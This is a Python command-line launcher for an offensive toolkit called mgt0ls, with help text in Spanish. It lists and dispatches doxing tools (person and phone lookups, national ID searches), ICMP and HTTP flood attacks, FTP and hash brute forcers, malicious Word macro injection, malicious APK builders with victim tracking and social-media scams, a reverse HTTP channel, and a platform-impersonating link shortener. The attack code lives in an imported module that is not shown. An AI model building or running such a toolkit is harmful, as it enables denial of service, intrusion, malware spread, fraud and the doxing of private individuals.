import argparse
from __prog__fast__ import *

dox_lst = []; ddos_lst = []
dic_lst = []; vec_lst = []
cmd_lst = []; mal_lst = []

execute_s = {

    "seeker": [
        seeker, 
        "a", 
        "[DESCRIPCION]\nRecopila información sobre usuarios buscando en diversas fuentes web.\n\n"
        "[USO]\npython3 fsh.py seeker --a <nombre_de_usuario>\n\n"
        "[PARAMETROS]\n--a: Nombre de usuario a buscar (obligatorio).",
        "dox"
    ],
    "icmpdos": [
        icmpdos, 
        "ab", 
        "[DESCRIPCION]\nRealiza un ataque DDoS utilizando paquetes ICMP.\n\n"
        "[USO]\npython3 fsh.py icmpdos --a <ip_destino> --b <tamaño_paquete>\n\n"
        "[PARAMETROS]\n--a: Dirección IP del objetivo (obligatorio).\n"
        "--b: Tamaño del paquete ICMP en bytes (opcional, recomendado: 65550).",
        "ddos"
    ],
    "lopiapi": [
        lopiapi, 
        "a", 
        "[DESCRIPCION]\nBusca información asociada a un número telefónico mediante APIs.\n\n"
        "[USO]\npython3 fsh.py lopiapi --a <número_telefónico>\n\n"
        "[PARAMETROS]\n--a: Número telefónico, ejemplo: 983222434 (obligatorio).",
        "dox"
    ],
    "unzipper": [
        unzipper, 
        "ab", 
        "[DESCRIPCION]\nDescomprime archivos protegidos con contraseña mediante ataque de diccionario.\n\n"
        "[USO]\npython3 fsh.py unzipper --a <ruta_diccionario> --b <ruta_archivo_zip>\n\n"
        "[PARAMETROS]\n--a: Ruta al diccionario de contraseñas (obligatorio).\n"
        "--b: Ruta al archivo ZIP (obligatorio).",
        "dic"
    ],
    "tempmail": [
        tempmail, 
        "ab", 
        "[DESCRIPCION]\nCrea correos temporales usando Mailnesia.\n\n"
        "[USO]\npython3 fsh.py tempmail --a <alias_correo> --b <número_mensaje>\n\n"
        "[PARAMETROS]\n--a: Alias del correo temporal (obligatorio).\n"
        "--b: Número del mensaje en la bandeja (opcional).",
        "vec"
    ],
        "urljump": [
        urljump, 
        "ab", 
        "[DESCRIPCION]\nGenera enlaces de invitacion aleatorios para RRSS.\n\n"
        "[USO]\npython3 fsh.py urljump --a <RRSS_to_gen> --b <cantidad>\n\n"
        "[PARAMETROS]\n--a: Enlace de RRSS a generar (e.g., `WA` para WhatsApp, `TG` para Telegram, `DC` para Discord, `BT` para Bit.ly, `YT` para YouTube, obligatorio).\n"
        "--b: Cantidad a generar (obligatorio).",
        "vec"
    ],
    "wordinfect": [
        wordinfect, 
        "ab", 
        "[DESCRIPCION]\nInserta macros maliciosas en documentos Word habilitados para macros.\n\n"
        "[USO]\npython3 fsh.py wordinfect --a <ruta_docm> --b <ruta_macro>\n\n"
        "[PARAMETROS]\n--a: Ruta al archivo de Word (.docm, obligatorio).\n"
        "--b: Ruta al archivo que contiene la macro (obligatorio).",
        "mal"
    ],
    "macromaker": [
        macromaker, 
        "a", 
        "[DESCRIPCION]\nCrea scripts de macros para Microsoft Word.\n\n"
        "[USO]\npython3 fsh.py macromaker\n\n"
        "[PARAMETROS]\nSin parámetros adicionales.",
        "mal"
    ],
    "findperson": [
        findperson, 
        "ab", 
        "[DESCRIPCION]\nObten el posible DNI de una persona.\n\n"
        "[USO]\npython3 fsh.py findperson --a <nombre_persona> --b <A|C|C|G|M|V|ALL>\n\n"
        "[PARAMETROS]\n--a: Nombre de la persona a buscar (obligatorio).\n"
        "--b: Código del país (e.g., `A` para Argentina, `C` para Chile, `V` para Venezuela, `C` para Colombia, `G` para Guatemala, `M` para Mexico, `B` para Bolivia, `ALL` para todos los países, obligatorio).",
        "dox"
    ],
    "iplocate": [
        iplocate, 
        "a", 
        "[DESCRIPCION]\nLocaliza direcciones IP y proporciona detalles como ubicación, ISP y más.\n\n"
        "[USO]\npython3 fsh.py iplocate --a <dirección_ip>\n\n"
        "[PARAMETROS]\n--a: Dirección IP objetivo (obligatorio).",
        "dox"
    ],
    "httpflood": [
        httpflood, 
        "a", 
        "[DESCRIPCION]\nSatura un servidor web enviando múltiples solicitudes HTTP.\n\n"
        "[USO]\npython3 fsh.py httpflood --a <url_objetivo>\n\n"
        "[PARAMETROS]\n--a: URL del servidor objetivo (obligatorio).",
        "ddos"
    ],
    "ftpbrute": [
        ftpbrute, 
        "abcd", 
        "[DESCRIPCION]\nRealiza ataques de fuerza bruta contra servidores FTP.\n\n"
        "[USO]\npython3 fsh.py ftpbrute --a <modo> --b <servidor_ftp> --c <usuario|diccionario_usuarios> --d <diccionario_contraseñas>\n\n"
        "[PARAMETROS]\n--a: Modo de ataque (`mul` para múltiples usuarios, `one` para un único usuario, obligatorio).\n"
        "--b: Dirección del servidor FTP (obligatorio).\n"
        "--c: Usuario o diccionario de usuarios (obligatorio).\n"
        "--d: Diccionario de contraseñas (obligatorio).",
        "dic"
    ],
    "webdumper": [
        webdumper, 
        "abc", 
        "[DESCRIPCION]\nExplora sitios web buscando directorios y archivos ocultos.\n\n"
        "[USO]\npython3 fsh.py webdumper --a <F|S> --b <url> --c <diccionario>\n\n"
        "[PARAMETROS]\n--a: Modo (`F` para inicial, `S` para recursivo, obligatorio).\n"
        "--b: URL base (obligatorio).\n"
        "--c: Diccionario con palabras clave (obligatorio).",
        "dic"
    ],
    "unlocker": [
        unlocker, 
        "abc", 
        "[DESCRIPCION]\nRompe hashes MD5 y SHA1 con fuerza bruta.\n\n"
        "[USO]\npython3 fsh.py unlocker --a <MD5|SHA1> --b <diccionario> --c <hash>\n\n"
        "[PARAMETROS]\n--a: Modo (`MD5` para cifrado md5, `SHA1` para cifrado SHA1, obligatorio).\n"
        "--b: Diccionario de palabras (obligatorio).\n"
        "--c: Hash a romper (obligatorio).",
        "dic"
    ],
    "sc4pk": [
        sc4pk, 
        "ab", 
        "[DESCRIPCION]\nGenera APK maliciosos para propagar malware.\n\n"
        "[USO]\npython3 fsh.py sc4pk --a <ID_de_seguimiento> --b <ig|fb|tw|go> | Creacion del APK.\n"
        "python3 fsh.py sc4pk --a <ID_de_seguimiento> | Busqueda de victimas.\n\n"
        "[PARAMETROS]\n--a: ID asociada a tus victimas, (obligatorio).\n"
        "--b: Scam a usar (ig para Instagram, fb para Facebook, tw para Twitter, go para Google, opcional)",
        "mal"
    ],
    "reverhttp": [
        reverhttp, 
        "a", 
        "[DESCRIPCION]\nEstablece un canal remoto usando solicitudes HTTP/POST.\n\n"
        "[USO]\npython3 fsh.py reverhttp --a <PORT|URL>\n\n"
        "[PARAMETROS]\n--a PORT Para crear un host local y URL para host externo.",
        "mal"
    ],
    "m4cware": [
        m4cware,
        "None",
        "[DESCRIPCION]\nCrea un APK malicioso para rastreo o infección.\n\n"
        "[USO]\npython3 fsh.py m4cware",
        "mal"
    ],
    "lang_cfg": [
        lang_cfg,
        "a",
        "[DESCRIPCION]\nConfigura el idioma de mgt0ls.\n\n"
        "[USO]\npython3 fsh.py lang_cfg --a <EN|AR|ES|ETC>\n\n"
        "[PARAMETROS]\n--a Idioma que se utilizara permanentemente.",
        "cmd"
    ],
    "check_up": [
        update,
        "None",
        "[DESCRIPCION]\nVerifica si es que mgt0ls esta actualizado.\n\n"
        "[USO]\npython3 fsh.py update",
        "cmd"
    ],
    "shorty": [
        shorty,
        "abc",
        "[DESCRIPCION]\nAcortador de enlaces maliciosos.\n\n"
        "[USO]\npython3 fsh.py shorty --a <GOO|LIN|WHA|YOU|RID|TIN> --b <URL> --c <ALIAS>\n\n"
        "[PARAMETROS]\n--a Suplantar plataforma (GOO para Google, LIN para Linkedin, WHA para WhatsApp, YOU para YouTube, RID para Ride.ee, TIN para Tin.al, obligatorio).\n"
        "--b URL a acortar, (obligatorio).\n"
        "--c Alias para el enlace acortado, (opcional).",
        "vec"
    ]
}

GUI_scripts = [
    "m4cware"
]

keys_ = execute_s.keys()

for key in keys_:

    temp_ls = execute_s[key][2].split("\n\n")
    temp_sv = temp_ls[0].replace("[DESCRIPCION]\n", "> "+key+"| :: ").split("|") # Se obtiene solamente la descipcion y el nombre se guarda una lista anidada
    # ["nombre", "descripcion"]

    # TIPOS: dox, ddos, dic, mal, vec, cmd
    type_tmp = execute_s[key][3]
    if type_tmp == "dox":
        dox_lst.append(temp_sv)
    elif type_tmp == "ddos":
        ddos_lst.append(temp_sv)
    elif type_tmp == "dic":
        dic_lst.append(temp_sv)
    elif type_tmp == "mal":
        mal_lst.append(temp_sv)
    elif type_tmp == "vec":
        vec_lst.append(temp_sv)
    elif type_tmp == "cmd":
        cmd_lst.append(temp_sv)


tb_dox = tabulate(dox_lst).replace("-", "")
tb_ddos = tabulate(ddos_lst).replace("-", "")
tb_dic = tabulate(dic_lst).replace("-", "")
tb_mal = tabulate(mal_lst).replace("-", "")
tb_vec = tabulate(vec_lst).replace("-", "")
tb_cmd = tabulate(cmd_lst).replace("-", "")


mgtols = R"""
  __________
 / ___  ___ \     
/ / . \/ . \ \   
\ \___/\___/ /\  
 \____\/____/||  [ YouTube DEV ] ￬ [ mgt0l$ V2.19.2 ]
 /     /\\\\\//  
|     |\\\\\\    > https://ytub.ee/IND4RKHK
 \      \\\\\\
   \______/\\\\  :: I See You ::
    _||_||_"""

scripts_h = "\n[ DOXING TOOLS ]\n" + tb_dox + "\n[ DDoS TOOLS ]\n" + tb_ddos + "\n[ BRUTE FORCE TOOLS ]\n" + tb_dic + "\n[ MALWARE TOOLS ]\n" + tb_mal + "\n[ VECTOR TOOLS ]\n" + tb_vec + "\n[ SETTINGS ]\n" + tb_cmd

parse = argparse.ArgumentParser(usage=mgtols+translate(scripts_h))

parse.add_argument("tool", type=str, help="<tool_to_execute_usage>")
parse.add_argument("--a", type=str, help="<optional>")
parse.add_argument("--b", type=str, help="<optional>")
parse.add_argument("--c", type=str, help="<optional>")
parse.add_argument("--d", type=str, help="<optional>")

arguments = parse.parse_args()

try:

    if arguments.tool == "check_up":
        print(translate(execute_s[arguments.tool][0]()))
        exit(0)

    if arguments.tool in execute_s and arguments.a == None and arguments.tool not in GUI_scripts:
        print(translate(execute_s[arguments.tool][2]))

    # Se ejecutan dependiendo de la cantidad de parametros necesarios

    elif arguments.tool in execute_s and arguments.a != None:

        if execute_s[arguments.tool][1] == "a":
            execute_s[arguments.tool][0](arguments.a)

        if execute_s[arguments.tool][1] == "ab":
            execute_s[arguments.tool][0](arguments.a, arguments.b)

        if execute_s[arguments.tool][1] == "abc":
            execute_s[arguments.tool][0](arguments.a, arguments.b, arguments.c)
        
        if execute_s[arguments.tool][1] == "abcd":
            execute_s[arguments.tool][0](arguments.a, arguments.b, arguments.c, arguments.d)

    elif arguments.tool in execute_s and arguments.tool in GUI_scripts: # Todo lo que este en GUI se ejecuta aqui
        execute_s[arguments.tool][0]()

    else:
        print(translate("[ERROR] Funcion no encontrada ..."))

except TypeError:
    print(translate(f"[ERROR] No colocaste todos los parametros en {arguments.tool} ..."))

except Exception as err:
    print(translate(f"[ERROR] {err}"))